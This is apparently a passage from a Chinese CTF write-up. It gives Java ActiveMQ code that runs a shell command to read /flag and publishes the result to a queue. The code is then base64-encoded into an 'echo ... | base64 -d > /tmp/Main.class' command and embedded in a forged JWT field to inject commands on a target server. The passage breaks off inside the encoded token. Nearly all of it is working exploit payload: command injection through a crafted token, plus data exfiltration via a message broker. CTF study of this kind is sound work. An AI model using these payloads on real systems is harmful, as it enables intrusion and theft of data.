<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">MessageListener</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">publish</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        javax.jms.ConnectionFactory factory;</span><br><span class="line">        factory = <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://127.0.0.1:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">pubSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> pubSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">publisher</span> <span class="operator">=</span> pubSession.createProducer(queue);</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /flag&quot;</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] bs = <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream())</span><br><span class="line">                .useDelimiter(<span class="string">&quot;\\A&quot;</span>)</span><br><span class="line">                .next()</span><br><span class="line">                .getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bs);</span><br><span class="line">        <span class="type">TextMessage</span> <span class="variable">msg</span> <span class="operator">=</span> pubSession.createTextMessage();</span><br><span class="line">        msg.setText(message);</span><br><span class="line">        publisher.send(msg);</span><br><span class="line">        System.out.println(<span class="string">&quot;publish finished&quot;</span>);</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://xxx:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">subSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> subSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageConsumer</span> <span class="variable">subscriber</span> <span class="operator">=</span> subSession.createConsumer(queue);</span><br><span class="line">        subscriber.setMessageListener(<span class="built_in">this</span>);</span><br><span class="line">        connection.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">         main.publish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(Message message)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Received &quot;</span> + ((TextMessage) message).getText());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们首先需要将这个文件写入服务器的某个位置，然后编译运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo aW1wb3J0IG9yZy5hcGFjaGUuYWN0aXZlbXEuQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeTsKaW1wb3J0IGphdmF4Lmptcy4qOwoKcHVibGljIGNsYXNzIE1haW4gaW1wbGVtZW50cyBNZXNzYWdlTGlzdGVuZXIgewogICAgcHJpdmF0ZSB2b2lkIHB1Ymxpc2goKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBqYXZheC5qbXMuQ29ubmVjdGlvbkZhY3RvcnkgZmFjdG9yeTsKICAgICAgICBmYWN0b3J5ID0gbmV3IEFjdGl2ZU1RQ29ubmVjdGlvbkZhY3RvcnkoInRjcDovLzEyNy4wLjAuMTo2MTYxNiIpOwogICAgICAgIENvbm5lY3Rpb24gY29ubmVjdGlvbiA9IGZhY3RvcnkuY3JlYXRlQ29ubmVjdGlvbigpOwogICAgICAgIFNlc3Npb24gcHViU2Vzc2lvbiA9IGNvbm5lY3Rpb24uY3JlYXRlU2Vzc2lvbihmYWxzZSwgU2Vzc2lvbi5BVVRPX0FDS05PV0xFREdFKTsKICAgICAgICBRdWV1ZSBxdWV1ZSA9IHB1YlNlc3Npb24uY3JlYXRlUXVldWUoImZsYWdxdWV1ZSIpOwogICAgICAgIE1lc3NhZ2VQcm9kdWNlciBwdWJsaXNoZXIgPSBwdWJTZXNzaW9uLmNyZWF0ZVByb2R1Y2VyKHF1ZXVlKTsKICAgICAgICBTdHJpbmdbXSBjbWQgPSBuZXcgU3RyaW5nW117Ii9iaW4vc2giLCItYyIsImNhdCAvZmxhZyJ9OwogICAgICAgIGJ5dGVbXSBicyA9IG5ldyBTY2FubmVyKG5ldyBQcm9jZXNzQnVpbGRlcihjbWQpLnN0YXJ0KCkuZ2V0SW5wdXRTdHJlYW0oKSkKICAgICAgICAgICAgICAgIC51c2VEZWxpbWl0ZXIoIlxcQSIpCiAgICAgICAgICAgICAgICAubmV4dCgpCiAgICAgICAgICAgICAgICAuZ2V0Qnl0ZXMoKTsKICAgICAgICBTdHJpbmcgbWVzc2FnZSA9IG5ldyBTdHJpbmcoYnMpOwogICAgICAgIFRleHRNZXNzYWdlIG1zZyA9IHB1YlNlc3Npb24uY3JlYXRlVGV4dE1lc3NhZ2UoKTsKICAgICAgICBtc2cuc2V0VGV4dChtZXNzYWdlKTsKICAgICAgICBwdWJsaXNoZXIuc2VuZChtc2cpOwogICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigicHVibGlzaCBmaW5pc2hlZCIpOwogICAgICAgIGNvbm5lY3Rpb24uY2xvc2UoKTsKICAgIH0KCiAgICBwcml2YXRlIHZvaWQgY29uc3VtZSgpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIENvbm5lY3Rpb25GYWN0b3J5IGZhY3RvcnkgPSBuZXcgQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeSgidGNwOi8veHh4OjYxNjE2Iik7CiAgICAgICAgQ29ubmVjdGlvbiBjb25uZWN0aW9uID0gZmFjdG9yeS5jcmVhdGVDb25uZWN0aW9uKCk7CiAgICAgICAgU2Vzc2lvbiBzdWJTZXNzaW9uID0gY29ubmVjdGlvbi5jcmVhdGVTZXNzaW9uKGZhbHNlLCBTZXNzaW9uLkFVVE9fQUNLTk9XTEVER0UpOwogICAgICAgIFF1ZXVlIHF1ZXVlID0gc3ViU2Vzc2lvbi5jcmVhdGVRdWV1ZSgiZmxhZ3F1ZXVlIik7CiAgICAgICAgTWVzc2FnZUNvbnN1bWVyIHN1YnNjcmliZXIgPSBzdWJTZXNzaW9uLmNyZWF0ZUNvbnN1bWVyKHF1ZXVlKTsKICAgICAgICBzdWJzY3JpYmVyLnNldE1lc3NhZ2VMaXN0ZW5lcih0aGlzKTsKICAgICAgICBjb25uZWN0aW9uLnN0YXJ0KCk7CiAgICB9CgoKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIE1haW4gbWFpbiA9IG5ldyBNYWluKCk7CiAgICAgICAgIG1haW4ucHVibGlzaCgpOwogICAgfQoKICAgIEBPdmVycmlkZQogICAgcHVibGljIHZvaWQgb25NZXNzYWdlKE1lc3NhZ2UgbWVzc2FnZSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiUmVjZWl2ZWQgIiArICgoVGV4dE1lc3NhZ2UpIG1lc3NhZ2UpLmdldFRleHQoKSk7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgICB9CiAgICB9Cn0gICAK|base64 -d &gt;/tmp/Main.class</span><br></pre></td></tr></table></figure>
<p>构造的jwt如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lpcAllCom&quot;:[&quot;echo aW1wb3J0IG9yZy5hcGFjaGUuYWN0aXZlbXEuQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeTsKaW1wb3J0IGphdmF4Lmptcy4qOwoKcHVibGljIGNsYXNzIE1haW4gaW1wbGVtZW50cyBNZXNzYWdlTGlzdGVuZXIgewogICAgcHJpdmF0ZSB2b2lkIHB1Ymxpc2goKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBqYXZheC5qbXMuQ29ubmVjdGlvbkZhY3RvcnkgZmFjdG9yeTsKICAgICAgICBmYWN0b3J5ID0gbmV3IEFjdGl2ZU1RQ29ubmVjdGlvbkZhY3RvcnkoInRjcDovLzEyNy4wLjAuMTo2MTYxNiIpOwogICAgICAgIENvbm5lY3Rpb24gY29ubmVjdGlvbiA9IGZhY3RvcnkuY3JlYXRlQ29ubmVjdGlvbigpOwogICAgICAgIFNlc3Npb24gcHViU2Vzc2lvbiA9IGNvbm5lY3Rpb24uY3JlYXRlU2Vzc2lvbihmYWxzZSwgU2Vzc2lvbi5BVVRPX0FDS05PV0xFREdFKTsKICAgICAgICBRdWV1ZSBxdWV1ZSA9IHB1YlNlc3Npb24uY3JlYXRlUXVldWUoImZsYWdxdWV1ZSIpOwogICAgICAgIE1lc3NhZ2VQcm9kdWNlciBwdWJsaXNoZXIgPSBwdWJTZXNzaW9uLmNyZWF0ZVByb2R1Y2VyKHF1ZXVlKTsKICAgICAgICBTdHJpbmdbXSBjbWQgPSBuZXcgU3RyaW5nW117Ii9iaW4vc2giLCItYyIsImNhdCAvZmxhZyJ9OwogICAgICAgIGJ5dGVbXSBicyA9IG5ldyBTY2FubmVyKG5ldyBQcm9jZXNzQnVpbGRlcihjbWQpLnN0YXJ0KCkuZ2V0SW5wdXRTdHJlYW0oKSkKICAgICAgICAgICAgICAgIC51c2VEZWxpbWl0ZXIoIlxcQSIpCiAgICAgICAgICAgICAgICAubmV4dCgpCiAgICAgICAgICAgICAgICAuZ2V0Qnl0ZXMoKTsKICAgICAgICBTdHJpbmcgbWVzc2FnZSA9IG5ldyBTdHJpbmcoYnMpOwogICAgICAgIFRleHRNZXNzYWdlIG1zZyA9IHB1YlNlc3Npb24uY3JlYXRlVGV4dE1lc3NhZ2UoKTsKICAgICAgICBtc2cuc2V0VGV4dChtZXNzYWdlKTsKICAgICAgICBwdWJsaXNoZXIuc2VuZChtc2cpOwogICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigicHVibGlzaCBmaW5pc2hlZCIpOwogICAgICAgIGNvbm5lY3Rpb24uY2xvc2UoKTsKICAgIH0KCiAgICBwcml2YXRlIHZvaWQgY29uc3VtZSgpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIENvbm5lY3Rpb25GYWN0b3J5IGZhY3RvcnkgPSBuZXcgQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeSgidGNwOi8veHh4OjYxNjE2Iik7CiAgICAgICAgQ29ubmVjdGlvbiBjb25uZWN0aW9uID0gZmFjdG9yeS5jcmVhdGVDb25uZWN0aW9uKCk7CiAgICAgICAgU2Vzc2lvbiBzdWJTZXNzaW9uID0gY29ubmVjdGlvbi5jcmVhdGVTZXNzaW9uKGZhbHNlLCBTZXNzaW9uLkFVVE9fQUNLTk9XTEVER0UpOwogICAgICAgIFF1ZXVlIHF1ZXVlID0gc3ViU2Vzc2lvbi5jcmVhdGVRdWV1ZSgiZmxhZ3F1ZXVlIik7CiAgICAgICAgTWVzc2FnZUNvbnN1bWVyIHN1YnNjcmliZXIgPSBzdWJTZXNzaW9uLmNyZWF0ZUNvbnN1bWVyKHF1ZXVlKTsKICAgICAgICBzdWJzY3JpYmVyLnNldE1lc3NhZ2VMaXN0ZW5lcih0aGlzKTsKICAgICAgICBjb25uZWN0aW9uLnN0YXJ0KCk7CiAgICB9CgoKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIE1haW4gbWFpbiA9IG5ldyBNYWluKCk7CiAgICAgICAgIG1haW4ucHVibGlzaCgpOwogICAgfQoKICAgIEBPdmVycmlkZQogICAgcHVibGljIHZvaWQgb25NZXNzYWdlKE1lc3NhZ2UgbWVzc2FnZSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiUmVjZWl2ZWQgIiArICgoVGV4dE1lc3NhZ2UpIG1lc3NhZ2UpLmdldFRleHQoKSk7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgICB9CiAgICB9Cn0gICAK|base64 -d &gt;/tmp/Main.class&quot;,&quot;echo aW1wb3J0IG9yZy5hcGFjaGUuYWN0aXZlbXEuQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeTsKaW1wb3J0IGphdmF4Lmptcy4qOwoKcHVibGljIGNsYXNzIE1haW4gaW1wbGVtZW50cyBNZXNzYWdlTGlzdGVuZXIgewogICAgcHJpdmF0ZSB2b2lkIHB1Ymxpc2goKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBqYXZheC5qbXMuQ29ubmVjdGlvbkZhY3RvcnkgZmFjdG9yeTsKICAgICAgICBmYWN0b3J5ID0gbmV3IEFjdGl2ZU1RQ29ubmVjdGlvbkZhY3RvcnkoInRjcDovLzEyNy4wLjAuMTo2MTYxNiIpOwogICAgICAgIENvbm5lY3Rpb24gY29ubmVjdGlvbiA9IGZhY3RvcnkuY3JlYXRlQ29ubmVjdGlvbigpOwogICAgICAgIFNlc3Npb24gcHViU2Vzc2lvbiA9IGNvbm5lY3Rpb24uY3JlYXRlU2Vzc2lvbihmYWxzZSwgU2Vzc2lvbi5BVVRPX0FDS05PV0xFREdFKTsKICAgICAgICBRdWV1ZSBxdWV1ZSA9IHB1YlNlc3Npb24uY3JlYXRlUXVldWUoImZsYWdxdWV1ZSIpOwogICAgICAgIE1lc3NhZ2VQcm9kdWNlciBwdWJsaXNoZXIgPSBwdWJTZXNzaW9uLmNyZWF0ZVByb2R1Y2VyKHF1ZXVlKTsKICAgICAgICBTdHJpbmdbXSBjbWQgPSBuZXcgU3RyaW5nW117Ii9iaW4vc2giLCItYyIsImNhdCAvZmxhZyJ9OwogICAgICAgIGJ5dGVbXSBicyA9IG5ldyBTY2FubmVyKG5ldyBQcm9jZXNzQnVpbGRlcihjbWQpLnN0YXJ0KCkuZ2V0SW5wdXRTdHJlYW0oKSkKICAgICAgICAgICAgICAgIC51c2VEZWxpbWl0ZXIoIlxcQSIpCiAgICAgICAgICAgICAgICAubmV4dCgpCiAgICAgICAgICAgICAgICAuZ2V0Qnl0ZXMoKTsKICAgICAgICBTdHJpbmcgbWVzc2FnZSA9IG5ldyBTdHJpbmcoYnMpOwogICAgICAgIFRleHRNZXNzYWdlIG1zZyA9IHB1YlNlc3Npb24uY3JlYXRlVGV4dE1lc3NhZ2UoKTsKICAgICAgICBtc2cuc2V0VGV4dChtZXNzYWdlKTsKICAgICAgICBwdWJsaXNoZXIuc2VuZChtc2cpOwogICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigicHVibGlzaCBmaW5pc2hlZCIpOwogICAgICAgIGNvbm5lY3Rpb24uY2xvc2UoKTsKICAgIH0KCiAgICBwcml2YXRlIHZvaWQgY29uc3VtZSgpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIENvbm5lY3Rpb25GYWN0b3J5IGZhY3RvcnkgPSBuZXcgQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeSgidGNwOi8veHh4OjYxNjE2Iik7CiAgICAgICAgQ29ubmVjdGlvbiBjb25uZWN0aW9uID0gZmFjdG9yeS5jcmVhdGVDb25uZWN0aW9uKCk7CiAgICAgICAgU2Vzc2lvbiBzdWJTZXNzaW9uID0gY29ubmVjdGlvbi5jcmVhdGVTZXNzaW9uKGZhbHNlLCBTZXNzaW9uLkFVVE9fQUNLTk9XTEVER0UpOwogICAgICAgIFF1ZXVlIHF1ZXVlID0gc3ViU2Vzc2lvbi5jcmVhdGVRdWV1ZSgiZmxhZ3F1ZXVlIik7CiAgICAgICAgTWVzc2FnZUNvbnN1bWVyIHN1YnNjcmliZXIgPSBzdWJTZXNzaW9uLmNyZWF0ZUNvbnN1bWVyKHF1ZXVlKTsKICAgICAgICBzdWJzY3JpYmVyLnNldE1lc3NhZ2VMaXN0ZW5lcih0aGlzKTsKICAgICAgICBjb25uZWN0aW9uLnN0YXJ0KCk7CiAgICB9CgoKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIE1haW4gbWFpbiA9IG5ldyBNYWluKCk7CiAgICAgICAgIG1haW4ucHVibGlzaCgpOwogICAgfQoKICAgIEBPdmVycmlkZQogICAgcHVibGljIHZvaWQgb25NZXNzYWdlKE1lc3NhZ2UgbWVzc2FnZSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiUmVjZWl2ZWQgIiArICgoVGV4dE1lc3NhZ2UpIG1lc3NhZ2UpLmdldFRleHQoKSk7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgICB9CiAgICB9Cn0gICAK|base64 -d &gt;/tmp/Main.class&quot;]&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJscGNBbGxDb20iOlsiZWNobyBhVzF3YjNKMElHOXlaeTVoY0dGamFHVXVZV04wYVhabGJYRXVRV04wYVhabFRWRkRiMjV1WldOMGFXOXVSbUZqZEc5eWVUc0thVzF3YjNKMElHcGhkbUY0TG1wdGN5NHFPd29LY0hWaWJHbGpJR05zWVhOeklFMWhhVzRnYVcxd2JHVnRaVzUwY3lCTlpYTnpZV2RsVEdsemRHVnVaWElnZXdvZ0lDQWdjSEpwZG1GMFpTQjJiMmxrSUhCMVlteHBjMmdvS1NCMGFISnZkM01nUlhoalpYQjBhVzl1SUhzS0lDQWdJQ0FnSUNCcVlYWmhlQzVxYlhNdVEyOXVibVZqZEdsdmJrWmhZM1J2Y25rZ1ptRmpkRzl5ZVRzS0lDQWdJQ0FnSUNCbVlXTjBiM0o1SUQwZ2JtVjNJRUZqZEdsMlpVMVJRMjl1Ym1WamRHbHZia1poWTNSdmNua29JblJqY0Rvdkx6RXlOeTR3TGpBdU1UbzJNVFl4TmlJcE93b2dJQ0FnSUNBZ0lFTnZibTVsWTNScGIyNGdZMjl1Ym1WamRHbHZiaUE5SUdaaFkzUnZjbmt1WTNKbFlYUmxRMjl1Ym1WamRHbHZiaWdwT3dvZ0lDQWdJQ0FnSUZObGMzTnBiMjRnY0hWaVUyVnpjMmx2YmlBOUlHTnZibTVsWTNScGIyNHVZM0psWVhSbFUyVnpjMmx2YmlobVlXeHpaU3dnVTJWemMybHZiaTVCVlZSUFgwRkRTMDVQVjB4RlJFZEZLVHNLSUNBZ0lDQWdJQ0JSZFdWMVpTQnhkV1YxWlNBOUlIQjFZbE5sYzNOcGIyNHVZM0psWVhSbFVYVmxkV1VvSW1ac1lXZHhkV1YxWlNJcE93b2dJQ0FnSUNBZ0lFMWxjM05oWjJWUWNtOWtkV05sY2lCd2RXSnNhWE5vWlhJZ1BTQndkV0pUWlhOemFXOXVMbU55WldGMFpWQnliMlIxWTJWeUtIRjFaWFZsS1RzS0lDQWdJQ0FnSUNCVGRISnBibWRiWFNCamJXUWdQU0J1WlhjZ1UzUnlhVzVuVzExN0lpOWlhVzR2YzJnaUxDSXRZeUlzSW1OaGRDQXZabXhoWnlKOU93b2dJQ0FnSUNBZ0lHSjVkR1ZiWFNCaWN5QTlJRzVsZHlCVFkyRnVibVZ5S0c1bGR5QlFjbTlqWlhOelFuVnBiR1JsY2loamJXUXBMbk4wWVhKMEtDa3VaMlYwU1c1d2RYUlRkSEpsWVcwb0tTa0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDNTFjMlZFWld4cGJXbDBaWElvSWx4Y1FTSXBDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXVibVY0ZENncENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdVoyVjBRbmwwWlhNb0tUc0tJQ0FnSUNBZ0lDQlRkSEpwYm1jZ2JXVnpjMkZuWlNBOUlHNWxkeUJUZEhKcGJtY29Zbk1wT3dvZ0lDQWdJQ0FnSUZSbGVIUk5aWE56WVdkbElHMXpaeUE5SUhCMVlsTmxjM05wYjI0dVkzSmxZWFJsVkdWNGRFMWxjM05oWjJVb0tUc0tJQ0FnSUNBZ0lDQnRjMmN1YzJWMFZHVjRkQ2h0WlhOellXZGxLVHNLSUNBZ0lDQWdJQ0J3ZFdKc2FYTm9aWEl1YzJWdVpDaHRjMmNwT3dvZ0lDQWdJQ0FnSUZONWMzUmxiUzV2ZFhRdWNISnBiblJzYmlnaWNIVmliR2x6YUNCbWFXNXBjMmhsWkNJcE93b2dJQ0FnSUNBZ0lHTnZibTVsWTNScGIyNHVZMnh2YzJVb0tUc0tJQ0FnSUgwS0NpQWdJQ0J3Y21sMllYUmxJSFp2YVdRZ1kyOXVjM1Z0WlNncElIUm9jbTkzY3lCRmVHTmxjSFJwYjI0Z2V3b2dJQ0FnSUNBZ0lFTnZibTVsWTNScGIyNUdZV04wYjNKNUlHWmhZM1J2Y25rZ1BTQnVaWGNnUVdOMGFYWmxUVkZEYjI1dVpXTjBhVzl1Um1GamRHOXllU2dpZEdOd09pOHZlSGg0T2pZeE5qRTJJaWs3Q2lBZ0lDQWdJQ0FnUTI5dWJtVmpkR2x2YmlCamIyNXVaV04wYVc5dUlEMGdabUZqZEc5eWVTNWpjbVZoZEdWRGIyNXVaV04wYVc5dUtDazdDaUFnSUNBZ0lDQWdVMlZ6YzJsdmJpQnpkV0pUWlhOemFXOXVJRDBnWTI5dWJtVmpkR2x2Ymk1amNtVmhkR1ZUWlhOemFXOXVLR1poYkhObExDQlRaWE56YVc5dUxrRlZWRTlmUVVOTFRrOVhURVZFUjBVcE93b2dJQ0FnSUNBZ0lGRjFaWFZsSUhGMVpYVmxJRDBnYzNWaVUyVnpjMmx2Ymk1amNtVmhkR1ZSZFdWMVpTZ2labXhoWjNGMVpYVmxJaWs3Q2lBZ0lDQWdJQ0FnVFdWemMyRm5aVU52Ym5OMWJXVnlJSE4xWW5OamNtbGlaWElnUFNCemRXSlRaWE56YVc5dUxtTnlaV0YwWlVOdmJuTjFiV1Z5S0hGMVpYVmxLVHNLSUNBZ0lDQWdJQ0J6ZFdKelkzSnBZbVZ5TG5ObGRFMWxjM05oWjJWTWFYTjBaVzVsY2loMGFHbHpLVHNLSUNBZ0lDQWdJQ0JqYjI1dVpXTjBhVzl1TG5OMFlYSjBLQ2s3Q2lBZ0lDQjlDZ29LSUNBZ0lIQjFZbXhwWXlCemRHRjBhV01nZG05cFpDQnRZV2x1S0ZOMGNtbHVaMXRkSUdGeVozTXBJSFJvY205M2N5QkZlR05sY0hScGIyNGdld29nSUNBZ0lDQWdJRTFoYVc0Z2JXRnBiaUE5SUc1bGR5Qk5ZV2x1S0NrN0NpQWdJQ0FnSUNBZ0lHMWhhVzR1Y0hWaWJHbHphQ2dwT3dvZ0lDQWdmUW9LSUNBZ0lFQlBkbVZ5Y21sa1pRb2dJQ0FnY0hWaWJHbGpJSFp2YVdRZ2IyNU5aWE56WVdkbEtFMWxjM05oWjJVZ2JXVnpjMkZuWlNrZ2V3b2dJQ0FnSUNBZ0lIUnllU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lGTjVjM1JsYlM1dmRYUXVjSEpwYm5Sc2JpZ2lVbVZqWldsMlpXUWdJaUFySUNnb1ZHVjRkRTFsYzNOaFoyVXBJRzFsYzNOaFoyVXBMbWRsZEZSbGVIUW9LU2s3Q2lBZ0lDQWdJQ0FnZlNCallYUmphQ0FvUlhoalpYQjBhVzl1SUdVcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnWlM1d2NtbHVkRk4wWVdOclZISmhZMlVvS1RzS0lDQWdJQ0FnSUNCOUNpQWdJQ0I5Q24wZ0lDQUt8YmFzZTY0IC1kID4vdG1wL01haW4uY2xhc3MiLCJlY2hvIGFXMXdiM0owSUc5eVp5NWhjR0ZqYUdVdVlXTjBhWFpsYlhFdVFXTjBhWFpsVFZGRGIyNXVaV04wYVc5dVJtRmpkRzl5ZVRzS2FXMXdiM0owSUdwaGRtRjRMbXB0Y3k0cU93b0tjSFZpYkdsaklHTnNZWE56SUUxaGFXNGdhVzF3YkdWdFpXNTBjeUJOWlhOellXZGxUR2x6ZEdWdVpYSWdld29nSUNBZ2NISnBkbUYwWlNCMmIybGtJSEIxWW14cGMyZ29LU0IwYUhKdmQzTWdSWGhqWlhCMGFXOXVJSHNLSUNBZ0lDQWdJQ0JxWVhaaGVDNXFiWE11UTI5dWJtVmpkR2x2YmtaaFkzUnZjbmtnWm1GamRHOXllVHNLSUNBZ0lDQWdJQ0JtWVdOMGIzSjVJRDBnYm1WM0lFRmpkR2wyWlUxUlEyOXVibVZqZEdsdmJrWmhZM1J2Y25rb0luUmpjRG92THpFeU55NHdMakF1TVRvMk1UWXhOaUlwT3dvZ0lDQWdJQ0FnSUVOdmJtNWxZM1JwYjI0Z1kyOXVibVZqZEdsdmJpQTlJR1poWTNSdmNua3VZM0psWVhSbFEyOXVibVZqZEdsdmJpZ3BPd29nSUNBZ0lDQWdJRk5sYzNOcGIyNGdjSFZpVTJWemMybHZiaUE5SUdOdmJtNWxZM1JwYjI0dVkzSmxZWFJsVTJWemMybHZiaWhtWVd4elpTd2dVMlZ6YzJsdmJpNUJWVlJQWDBGRFMwNVBWMHhGUkVkRktUc0tJQ0FnSUNBZ0lDQlJkV1YxWlNCeGRXVjFaU0E5SUhCMVlsTmxjM05wYjI0dVkzSmxZWFJsVVhWbGRXVW9JbVpzWVdkeGRXVjFaU0lwT3dvZ0lDQWdJQ0FnSUUxbGMzTmhaMlZRY205a2RXTmxjaUJ3ZFdKc2FYTm9aWElnUFNCd2RXSlRaWE56YVc5dUxtTnlaV0YwWlZCeWIyUjFZMlZ5S0hGMVpYVmxLVHNLSUNBZ0lDQWdJQ0JUZEhKcGJtZGJYU0JqYldRZ1BTQnVaWGNnVTNSeWFXNW5XMTE3SWk5aWFXNHZjMmdpTENJdFl5SXNJbU5oZENBdlpteGhaeUo5T3dvZ0lDQWdJQ0FnSUdKNWRHVmJYU0JpY3lBOUlHNWxkeUJUWTJGdWJtVnlLRzVsZHlCUWNtOWpaWE56UW5WcGJHUmxjaWhqYldRcExuTjBZWEowS0NrdVoyVjBTVzV3ZFhSVG